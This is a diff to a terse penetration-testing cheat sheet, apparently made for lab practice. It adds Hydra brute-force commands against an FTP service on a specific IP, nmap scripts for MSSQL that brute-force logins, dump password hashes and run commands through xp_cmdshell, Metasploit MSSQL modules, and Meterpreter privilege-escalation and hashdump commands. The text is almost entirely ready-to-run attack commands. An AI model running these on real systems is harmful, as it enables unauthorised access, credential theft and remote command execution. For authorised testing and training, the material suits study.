@@ -1,8 +1,9 @@
 # Hydra 
 
 Attacking un Common ports
-gzip -d /usr/share/wordlists/rockyou.txt.gz
-hydra -L /root/Desktop/wordlists/ftp_Users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://192.253.124.3:5554
+* gzip -d /usr/share/wordlists/rockyou.txt.gz
+* hydra -L /root/Desktop/wordlists/ftp_Users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://192.253.124.3:5554
+* /usr/share/wordlists/metasploit/common_users.txt && /usr/share/wordlists/metasploit/common_passwords.txt
 
 # Network
 
@@ -376,6 +377,44 @@ cp /bin/bash greetings
 #execute welcome file
 ./welcome
 ```
+
+MSSQL: 1433
+
+```bash
+## nmap
+nmap -sV -sC -p 1433 <TARGET_IP>
+
+nmap -p 1433 --script ms-sql-info <TARGET_IP>
+nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <TARGET_IP>
+nmap -p 1433 --script ms-sql-empty-password <TARGET_IP>
+nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlists/common_user.txt, passdb=/root/Desktop/wordlists/100-common-password.txt <TARGET_IP>
+nmap -p 1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password=sa,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt <TARGET_IP>
+nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=<name>,mssql.password=<> <TARGET_IP>
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<name>,mssql.password=<>,mssql-xp-cmdshell.cmd="ipconfig" <TARGET_IP>
+
+## Metasploit
+use auxiliary/scanner/mssql/mssql_login
+use auxiliary/admin/mssql/mssql_enum
+use auxiliary/admin/mssql/mssql_enum_sql_logins
+use auxiliary/admin/mssql/mssql_exec
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
+
+```
+
+#Meterpreter 
+getprivsps
+
+####Windows
+cd C:\\
+ls
+
+####Privilage Escalation 
+getsystem
+
+####Hashdump
+hashdump
+
+
 
 
 
